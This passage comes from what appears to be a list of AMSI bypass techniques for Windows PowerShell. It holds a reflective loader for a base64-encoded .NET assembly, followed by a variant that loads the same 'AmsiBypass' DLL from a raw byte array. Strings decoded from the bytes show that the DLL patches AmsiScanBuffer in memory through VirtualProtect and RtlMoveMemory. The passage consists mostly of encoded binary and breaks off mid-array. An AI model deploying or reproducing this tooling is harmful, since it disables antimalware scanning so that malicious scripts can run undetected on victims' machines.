gAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAFw8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==")) | Out-Null
        Write-Output "DLL has been reflected";
    }
    [Bypass.AMSI]::Patch()
}
```
# Same as 6 but integer Bytes instead of Base64 #

```
function MyPatch{
  if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {
    [Reflection.Assembly]::Load([byte[]]@(77, 90, 144, 0, 3, 0, 0, 0, 4, 0, 0, 0, 255, 255, 0, 0, 184, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 14, 31, 186, 14, 0, 180, 9, 205, 33, 184, 1, 76, 205, 33, 84, 104, 105, 115, 32, 112, 114, 111, 103, 114, 97, 109, 32, 99, 97, 110, 110, 111, 116, 32, 98, 101, 32, 114, 117, 110, 32, 105, 110, 32, 68, 79, 83, 32, 109, 111, 100, 101, 46, 13, 13, 10, 36, 0, 0, 0, 0, 0, 0, 0, 80, 69, 0, 0, 76, 1, 3, 0, 27, 37, 18, 183, 0, 0, 0, 0, 0, 0, 0, 0, 224, 0, 34, 32, 11, 1, 48, 0, 0, 14, 0, 0, 0, 6, 0, 0, 0, 0, 0, 0, 94, 44, 0, 0, 0, 32, 0, 0, 0, 64, 0, 0, 0, 0, 0, 16, 0, 32, 0, 0, 0, 2, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 128, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 3, 0, 64, 133, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 16, 0, 0, 16, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 44, 0, 0, 79, 0, 0, 0, 0, 64, 0, 0, 48, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 96, 0, 0, 12, 0, 0, 0, 44, 43, 0, 0, 84, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 8, 32, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 46, 116, 101, 120, 116, 0, 0, 0, 108, 12, 0, 0, 0, 32, 0, 0, 0, 14, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 96, 46, 114, 115, 114, 99, 0, 0, 0, 48, 3, 0, 0, 0, 64, 0, 0, 0, 4, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 64, 46, 114, 101, 108, 111, 99, 0, 0, 12, 0, 0, 0, 0, 96, 0, 0, 0, 2, 0, 0, 0, 20, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 66, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 2, 0, 5, 0, 64, 33, 0, 0, 236, 9, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 19, 48, 4, 0, 217, 0, 0, 0, 1, 0, 0, 17, 0, 114, 1, 0, 0, 112, 40, 1, 0, 0, 6, 10, 6, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 6, 17, 6, 44, 20, 0, 114, 19, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 56, 165, 0, 0, 0, 6, 114, 107, 0, 0, 112, 40, 2, 0, 0, 6, 11, 7, 126, 12, 0, 0, 10, 40, 13, 0, 0, 10, 19, 8, 17, 8, 44, 17, 0, 114, 137, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 119, 26, 106, 40, 15, 0, 0, 10, 12, 22, 13, 7, 8, 31, 64, 18, 3, 40, 3, 0, 0, 6, 22, 254, 1, 19, 9, 17, 9, 44, 17, 0, 114, 255, 0, 0, 112, 40, 14, 0, 0, 10, 0, 23, 19, 7, 43, 72, 25, 141, 18, 0, 0, 1, 37, 208, 1, 0, 0, 4, 40, 16, 0, 0, 10, 19, 4, 25, 40, 17, 0, 0, 10, 19, 5, 17, 4, 22, 17, 5, 25, 40, 18, 0, 0, 10, 0, 7, 31, 27, 40, 19, 0, 0, 10, 17, 5, 25, 40, 4, 0, 0, 6, 0, 114, 117, 1, 0, 112, 40, 14, 0, 0, 10, 0, 22, 19, 7, 43, 0, 17, 7, 42, 34, 2, 40, 20, 0, 0, 10, 0, 42, 0, 0, 66, 83, 74, 66, 1, 0, 1, 0, 0, 0, 0, 0, 12, 0, 0, 0, 118, 52, 46, 48, 46, 51, 48, 51, 49, 57, 0, 0, 0, 0, 5, 0, 108, 0, 0, 0, 212, 2, 0, 0, 35, 126, 0, 0, 64, 3, 0, 0, 176, 3, 0, 0, 35, 83, 116, 114, 105, 110, 103, 115, 0, 0, 0, 0, 240, 6, 0, 0, 204, 1, 0, 0, 35, 85, 83, 0, 188, 8, 0, 0, 16, 0, 0, 0, 35, 71, 85, 73, 68, 0, 0, 0, 204, 8, 0, 0, 32, 1, 0, 0, 35, 66, 108, 111, 98, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 1, 87, 149, 2, 52, 9, 2, 0, 0, 0, 250, 1, 51, 0, 22, 0, 0, 1, 0, 0, 0, 22, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 6, 0, 0, 0, 10, 0, 0, 0, 20, 0, 0, 0, 11, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 4, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 85, 2, 1, 0, 0, 0, 0, 0, 6, 0, 141, 1, 206, 2, 6, 0, 223, 1, 206, 2, 6, 0, 231, 0, 156, 2, 15, 0, 238, 2, 0, 0, 6, 0, 18, 1, 14, 2, 6, 0, 198, 1, 107, 2, 6, 0, 110, 1, 107, 2, 6, 0, 43, 1, 107, 2, 6, 0, 72, 1, 107, 2, 6, 0, 173, 1, 107, 2, 6, 0, 251, 0, 107, 2, 6, 0, 48, 3, 100, 2, 6, 0, 204, 0, 206, 2, 6, 0, 194, 0, 100, 2, 6, 0, 149, 2, 100, 2, 6, 0, 154, 0, 100, 2, 6, 0, 148, 2, 100, 2, 6, 0, 253, 1, 100, 2, 6, 0, 253, 2, 206, 2, 6, 0, 125, 3, 100, 2, 6, 0, 135, 0, 100, 2, 6, 0, 64, 2, 175, 2, 0, 0, 0, 0, 38, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 16, 0, 46, 2, 16, 3, 49, 0, 1, 0, 1, 0, 0, 1, 0, 0, 47, 0, 0, 0, 49, 0, 1, 0, 7, 0, 19, 1, 0, 0, 10, 0, 0, 0, 57, 0, 2, 0, 7, 0, 51, 1, 78, 0, 91, 0, 0, 0, 0, 0, 128, 0, 150, 32, 136, 3, 95, 0, 1, 0, 0, 0, 0, 0, 128, 0, 150, 32, 23, 3, 100, 0, 2, 0, 0, 0, 0, 0, 128, 0, 150, 32, 70, 3, 106, 0, 4, 0, 0, 0, 0, 0, 128, 0, 145, 32, 151, 3, 115, 0, 8, 0, 80, 32, 0, 0, 0, 0, 150, 0, 40, 2, 122, 0, 11, 0, 53, 33, 0, 0, 0, 0, 134, 24, 142, 2, 6, 0, 11, 0, 0, 0, 1, 0, 179, 0, 0, 0, 1, 0, 162, 0, 0, 0, 2, 0, 170, 0, 0, 0, 1, 0, 38, 3, 0, 0, 2, 0, 2, 2, 0, 0, 3, 0, 85, 3, 2, 0, 4, 0, 55, 3, 0, 0, 1, 0, 110, 3, 0, 0, 2, 0, 119, 0, 0, 0, 3, 0, 9, 2, 9, 0, 142, 2, 1, 0, 17, 0, 142, 2, 6, 0, 25, 0, 142, 2, 10, 0, 41, 0, 142, 2, 16, 0, 49, 0, 142, 2, 16, 0, 57, 0, 142, 2, 16, 0, 65, 0, 142, 2, 16, 0, 73, 0, 142, 2, 16, 0, 81, 0, 142, 2, 16, 0, 89, 0, 142, 2, 16, 0, 105, 0, 142, 2, 6, 0, 121, 0, 137, 2, 35, 0, 121, 0, 162, 3, 38, 0, 129, 0, 184, 0, 44, 0, 137, 0, 98, 3, 49, 0, 153, 0, 115, 3, 54, 0, 177, 0, 51, 2, 62, 0, 177, 0, 131, 3, 67, 0, 121, 0, 125, 2, 76, 0, 97, 0, 142, 2, 6, 0, 46, 0, 11, 0, 126, 0, 46, 0, 19, 0, 135, 0, 46, 0, 27, 0, 166, 0, 46, 0, 35, 0, 175, 0, 46, 0, 43, 0, 230, 0, 46, 0, 51, 0, 246, 0, 46, 0, 59, 0, 1, 1, 46, 0, 67, 0, 14, 1, 46, 0, 75, 0, 230, 0, 46, 0, 83, 0, 230, 0, 99, 0, 91, 0, 25, 1, 1, 0, 3, 0, 0, 0, 4, 0, 21, 0, 1, 0, 72, 2, 0, 1, 3, 0, 136, 3, 1, 0, 0, 1, 5, 0, 23, 3, 1, 0, 0, 1, 7, 0, 70, 3, 1, 0, 0, 1, 9, 0, 148, 3, 2, 0, 100, 44, 0, 0, 1, 0, 4, 128, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 12, 3, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 0, 123, 0, 0, 0, 0, 0, 4, 0, 3, 0, 0, 0, 0, 0, 0, 107, 101, 114, 110, 101, 108, 51, 50, 0, 95, 95, 83, 116, 97, 116, 105, 99, 65, 114, 114, 97, 121, 73, 110, 105, 116, 84, 121, 112, 101, 83, 105, 122, 101, 61, 51, 0, 60, 77, 111, 100, 117, 108, 101, 62, 0, 60, 80, 114, 105, 118, 97, 116, 101, 73, 109, 112, 108, 101, 109, 101, 110, 116, 97, 116, 105, 111, 110, 68, 101, 116, 97, 105, 108, 115, 62, 0, 53, 49, 67, 65, 70, 66, 52, 56, 49, 51, 57, 66, 48, 50, 69, 48, 54, 49, 68, 52, 57, 49, 57, 67, 53, 49, 55, 54, 54, 50, 49, 66, 70, 56, 55, 68, 65, 67, 69, 68, 0, 115, 114, 99, 0, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 0, 82, 117, 110, 116, 105, 109, 101, 70, 105, 101, 108, 100, 72, 97, 110, 100, 108, 101, 0, 67, 111, 110, 115, 111, 108, 101, 0, 104, 77, 111, 100, 117, 108, 101, 0, 112, 114, 111, 99, 78, 97, 109, 101, 0, 110, 97, 109, 101, 0, 87, 114, 105, 116, 101, 76, 105, 110, 101, 0, 86, 97, 108, 117, 101, 84, 121, 112, 101, 0, 67, 111, 109, 112, 105, 108, 101, 114, 71, 101, 110, 101, 114, 97, 116, 101, 100, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 68, 101, 98, 117, 103, 103, 97, 98, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 84, 105, 116, 108, 101, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 84, 97, 114, 103, 101, 116, 70, 114, 97, 109, 101, 119, 111, 114, 107, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 70, 105, 108, 101, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 97, 108, 86, 101, 114, 115, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 110, 102, 105, 103, 117, 114, 97, 116, 105, 111, 110, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 67, 111, 109, 112, 105, 108, 97, 116, 105, 111, 110, 82, 101, 108, 97, 120, 97, 116, 105, 111, 110, 115, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 80, 114, 111, 100, 117, 99, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 65, 115, 115, 101, 109, 98, 108, 121, 67, 111, 109, 112, 97, 110, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 82, 117, 110, 116, 105, 109, 101, 67, 111, 109, 112, 97, 116, 105, 98, 105, 108, 105, 116, 121, 65, 116, 116, 114, 105, 98, 117, 116, 101, 0, 66, 121, 116, 101, 0, 100, 119, 83, 105, 122, 101, 0, 115, 105, 122, 101, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 86, 101, 114, 115, 105, 111, 110, 105, 110, 103, 0, 80, 97, 116, 99, 104, 0, 65, 109, 115, 105, 0, 65, 108, 108, 111, 99, 72, 71, 108, 111, 98, 97, 108, 0, 77, 97, 114, 115, 104, 97, 108, 0, 107, 101, 114, 110, 101, 108, 51, 50, 46, 100, 108, 108, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 100, 108, 108, 0, 83, 121, 115, 116, 101, 109, 0, 83, 121, 115, 116, 101, 109, 46, 82, 101, 102, 108, 101, 99, 116, 105, 111, 110, 0, 111, 112, 95, 65, 100, 100, 105, 116, 105, 111, 110, 0, 90, 101, 114, 111, 0, 46, 99, 116, 111, 114, 0, 85, 73, 110, 116, 80, 116, 114, 0, 83, 121, 115, 116, 101, 109, 46, 68, 105, 97, 103, 110, 111, 115, 116, 105, 99, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 73, 110, 116, 101, 114, 111, 112, 83, 101, 114, 118, 105, 99, 101, 115, 0, 83, 121, 115, 116, 101, 109, 46, 82, 117, 110, 116, 105, 109, 101, 46, 67, 111, 109, 112, 105, 108, 101, 114, 83, 101, 114, 118, 105, 99, 101, 115, 0, 68, 101, 98, 117, 103, 103, 105, 110, 103, 77, 111, 100, 101, 115, 0, 82, 117, 110, 116, 105, 109, 101, 72, 101, 108, 112, 101, 114, 115, 0, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 71, 101, 116, 80, 114, 111, 99, 65, 100, 100, 114, 101, 115, 115, 0, 108, 112, 65, 100, 100, 114, 101, 115, 115, 0, 79, 98, 106, 101, 99, 116, 0, 108, 112, 102, 108, 79, 108, 100, 80, 114, 111, 116, 101, 99, 116, 0, 86, 105, 114, 116, 117, 97, 108, 80, 114, 111, 116, 101, 99, 116, 0, 102, 108, 78, 101, 119, 80, 114, 111, 116, 101, 99, 116, 0, 111, 112, 95, 69, 120, 112, 108, 105, 99, 105, 116, 0, 100, 101, 115, 116, 0, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101, 65, 114, 114, 97, 121, 0, 67, 111, 112, 121, 0, 76, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 0, 82, 116, 108, 77, 111, 118, 101, 77, 101, 109, 111, 114, 121, 0, 111, 112, 95, 69, 113, 117, 97, 108, 105, 116, 121, 0, 0, 0, 0, 17, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 0, 87, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 97, 0, 109, 0, 115, 0, 105, 0, 46, 0, 100, 0, 108, 0, 108, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 29, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 114, 0, 101, 0, 116, 0, 114, 0, 105, 0, 101, 0, 118, 0, 101, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 102, 0, 117, 0, 110, 0, 99, 0, 116, 0, 105, 0, 111, 0, 110, 0, 32, 0, 112, 0, 111, 0, 105, 0, 110, 0, 116, 0, 101, 0, 114, 0, 33, 0, 0, 117, 69, 0, 82, 0, 82, 0, 79, 0, 82, 0, 58, 0, 32, 0, 67, 0, 111, 0, 117, 0, 108, 0, 100, 0, 32, 0, 110, 0, 111, 0, 116, 0, 32, 0, 109, 0, 111, 0, 100, 0, 105, 0, 102, 0, 121, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 109, 0, 101, 0, 109, 0, 111, 0, 114, 0, 121, 0, 32, 0, 112, 0, 101, 0, 114, 0, 109, 0, 105, 0, 115, 0, 115, 0, 105, 0, 111, 0, 110, 0, 115, 0, 33, 0, 0, 83, 71, 0, 114, 0, 101, 0, 97, 0, 116, 0, 32, 0, 115, 0, 117, 0, 99, 0, 99, 0, 101, 0, 115, 0, 115, 0, 46, 0, 32, 0, 65, 0, 109, 0, 115, 0, 105, 0, 83, 0, 99, 0, 97, 0, 110, 0, 66, 0, 117, 0, 102, 0, 102, 0, 101, 0, 114, 0, 32, 0, 112, 0, 97, 0, 116, 0, 99, 0, 104, 0, 101, 0, 100, 0, 33, 0, 32, 0, 58, 0, 41, 0, 0, 0, 0, 0, 94, 196, 134, 67, 207, 43, 76, 71, 180, 110, 209, 17, 221, 107, 164, 138, 0, 4, 32, 1, 1, 8, 3, 32, 0, 1, 5, 32, 1, 1, 17, 17, 4, 32, 1, 1, 14, 13, 7, 10, 24, 24, 25, 9, 29, 5, 24, 2, 8, 2, 2, 2, 6, 24, 5, 0, 2, 2, 24, 24, 4, 0, 1, 1, 14, 4, 0, 1, 25, 11, 7, 0, 2, 1, 18, 81, 17, 85, 4, 0, 1, 24, 8, 8, 0, 4, 1, 29, 5, 8, 24, 8, 5, 0, 2, 24, 24, 8, 8, 204, 123, 19, 255, 205, 45, 221, 81, 3, 6, 17, 16, 4, 0, 1, 24, 14, 5, 0, 2, 24, 24, 14, 8, 0, 4, 2, 24, 25, 9, 16, 9, 6, 0, 3, 1, 24, 24, 8, 3, 0, 0, 8, 8, 1, 0, 8, 0, 0, 0, 0, 0, 30, 1, 0, 1, 0, 84, 2, 22, 87, 114, 97, 112, 78, 111, 110, 69, 120, 99, 101, 112, 116, 105, 111, 110, 84, 104, 114, 111, 119, 115, 1, 8, 1, 0, 7, 1, 0, 0, 0, 0, 54, 1, 0, 25, 46, 78, 69, 84, 83, 116, 97, 110, 100, 97, 114, 100, 44, 86, 101, 114, 115, 105, 111, 110, 61, 118, 50, 46, 48, 1, 0, 84, 14, 20, 70, 114, 97, 109, 101, 119, 111, 114, 107, 68, 105, 115, 112, 108, 97, 121, 78, 97, 109, 101, 0, 15, 1, 0, 10, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 0, 0, 10, 1, 0, 5, 68, 101, 98, 117, 103, 0, 0, 12, 1, 0, 7, 49, 46, 48, 46, 48, 46, 48, 0, 0, 10, 1, 0, 5, 49, 46, 48, 46, 48, 0, 0, 4, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 32, 92, 168, 168, 0, 1, 77, 80, 2, 0, 0, 0, 100, 0, 0, 0, 128, 43, 0, 0, 128, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 19, 0, 0, 0, 39, 0, 0, 0, 228, 43, 0, 0, 228, 13, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 82, 83, 68, 83, 215, 18, 206, 3, 139, 112, 185, 73, 189, 89, 99, 32, 233, 159, 0, 221, 1, 0, 0, 0, 47, 111, 112, 116, 47, 80, 114, 111, 106, 101, 99, 116, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 47, 111, 98, 106, 47, 68, 101, 98, 117, 103, 47, 110, 101, 116, 115, 116, 97, 110, 100, 97, 114, 100, 50, 46, 48, 47, 65, 109, 115, 105, 66, 121, 112, 97, 115, 115, 46, 112, 100, 98, 0, 83, 72, 65, 50, 53, 54, 0, 215, 18, 206, 3, 139, 112, 185, 169, 125, 89, 99, 32, 233, 159, 0, 221, 32, 92, 168, 40, 54, 252, 229, 155, 150, 128, 72, 101, 126, 213, 146, 143, 51, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 77, 44, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 63, 44, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 95, 67, 111, 114, 68, 108, 108, 77, 97, 105, 110, 0, 109, 115, 99, 111, 114, 101, 101, 46, 100, 108, 108, 0, 0, 0, 0, 0, 0, 255, 37, 0, 32, 0, 16, 49, 255, 144, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 16, 0, 0, 0, 24, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 48, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 72, 0, 0, 0, 88, 64, 0, 0, 212, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 212, 2, 52, 0, 0, 0, 86, 0, 83, 0, 95, 0, 86, 0, 69, 0, 82, 0, 83, 0, 73, 0, 79, 0, 78, 0, 95, 0, 73, 0, 78, 0, 70, 0, 79, 0, 0, 0, 0, 0, 189, 4, 239, 254, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 63, 0, 0, 0, 0, 0, 0, 0, 4, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 0, 0, 0, 1, 0, 86, 0, 97, 0, 114, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 0, 0, 36, 0, 4, 0, 0, 0, 84, 0, 114, 0, 97, 0, 110, 0, 115, 0, 108, 0, 97, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 0, 0, 176, 4, 52, 2, 0, 0, 1, 0, 83, 0, 116, 0, 114, 0, 105, 0, 110, 0, 103, 0, 70, 0, 105, 0, 108, 0, 101, 0, 73, 0, 110, 0, 102, 0, 111, 0, 0, 0, 16, 2, 0, 0, 1, 0, 48, 0, 48, 0, 48, 0, 48, 0, 48, 0, 52, 0, 98, 0, 48, 0, 0, 0, 54, 0, 11, 0, 1, 0, 67, 0, 111, 0, 109, 0, 112, 0, 97, 0, 110, 0, 121, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 62, 0, 11, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 68, 0, 101, 0, 115, 0, 99, 0, 114, 0, 105, 0, 112, 0, 116, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 0, 0, 0, 0, 48, 0, 8, 0, 1, 0, 70, 0, 105, 0, 108, 0, 101, 0, 86, 0, 101, 0, 114, 0, 115, 0, 105, 0, 111, 0, 110, 0, 0, 0, 0, 0, 49, 0, 46, 0, 48, 0, 46, 0, 48, 0, 46, 0, 48, 0, 0, 0, 62, 0, 15, 0, 1, 0, 73, 0, 110, 0, 116, 0, 101, 0, 114, 0, 110, 0, 97, 0, 108, 0, 78, 0, 97, 0, 109, 0, 101, 0, 0, 0, 65, 0, 109, 0, 115, 0, 105, 0, 66, 0, 121, 0, 112, 0, 97, 0, 115, 0, 115, 0, 46, 0, 100, 